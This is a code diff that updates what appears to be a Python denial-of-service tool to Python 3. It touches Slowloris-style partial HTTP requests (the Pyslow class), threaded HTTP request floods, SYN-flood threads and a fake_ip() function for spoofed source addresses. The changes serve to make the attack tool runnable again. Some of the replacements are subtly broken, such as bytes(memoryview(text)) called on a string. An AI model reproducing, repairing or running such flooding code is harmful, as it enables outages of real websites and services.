@@ -22,12 +22,13 @@ import time
 import string
 import signal
 import http.client
-import urllib.parse
+from urllib.parse import urlparse
 from random import *
 from socket import *
 from struct import *
 from threading import *
 from argparse import ArgumentParser,RawTextHelpFormatter
+from http.client import HTTPSConnection, HTTPConnection
 
 
 if os.name == 'posix':
@@ -41,7 +42,8 @@ else:
 
 try:
 	import requests,colorama
-	from termcolor import colored,cprint
+	from termcolor import colored,\
+		cprint
 except:
 	try:
 		if os.name == 'posix':
@@ -61,7 +63,7 @@ signal.signal(signal.SIGPIPE,signal.SIG_DFL)
 
 def fake_ip():
 	skip = '127'
-	rand = range(4)
+	rand = list(range(4))
 	for x in range(4):
 		rand[x] = randrange(0,256)
 	if rand[0] == skip:
@@ -110,13 +112,15 @@ class Pyslow:
 		self.sleep = sleep
 		self.method = ['GET','POST']
 		self.pkt_count = 0
+
 	def mypkt(self):
-		text = choice(self.method) + ' /' + str(randint(1,999999999)) + ' HTTP/1.1\r\n'+\
+		text = choice(self.method) + ' /' + str(randint(1, 999999999)) + ' HTTP/1.1\r\n'+\
 		      'Host:'+self.tgt+'\r\n'+\
 		      'User-Agent:'+choice(add_useragent())+'\r\n'+\
 		      'Content-Length: 42\r\n'
-		pkt = buffer(text)
+		pkt = bytes(memoryview(text))
 		return pkt
+
 	def building_socket(self):
 		try:
 			sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
@@ -191,7 +195,7 @@ class Pyslow:
 				fail+=1
 			except KeyboardInterrupt:
 				break
-				sys.exit(cprint('[-] Canceled by user','red'))
+				sys.exit(print('[-] Canceled by user','red'))
 		# print colored('I have sent ','green') + colored(str(self.pkt_count),'cyan') + colored(' packets successfully.Now i\'m going to sleep for ','green') + colored(self.sleep,'red') + colored(' second','green')
 		time.sleep(self.sleep)
 
@@ -203,7 +207,7 @@ class Requester(Thread):
 		self.ssl = False
 		self.req = []
 		self.lock=Lock()
-		url_type = urlparse.urlparse(self.tgt)
+		url_type = urlparse(self.tgt)
 		if url_type.scheme == 'https':
 			self.ssl = True
 			if self.ssl == True:
@@ -244,9 +248,9 @@ class Requester(Thread):
 	def run(self):
 		try:
 			if self.ssl:
-				conn = httplib.HTTPSConnection(self.tgt,self.port)
+				conn = HTTPSConnection(self.tgt,self.port)
 			else:
-				conn = httplib.HTTPConnection(self.tgt,self.port)
+				conn = HTTPConnection(self.tgt,self.port)
 				self.req.append(conn)
 			for reqter in self.req:
 				(url,http_header) = self.data()
@@ -402,7 +406,7 @@ Example:
 			else:
 				ip = args.i
 			try:
-				for x in xrange(0,int(args.T)):
+				for x in range(0, int(args.T)):
 					thread=Synflood(tgt,ip,sock=synsock)
 					thread.setDaemon(True)
 					thread.start()
@@ -415,7 +419,7 @@ Example:
 		print (colored('[*] Start send request to: ','blue')+colored(tgt,'red'))
 		while 1:
 			try:
-				for x in xrange(int(args.T)):
+				for x in range(int(args.T)):
 					t=Requester(tgt)
 					t.setDaemon(True)
 					t.start()
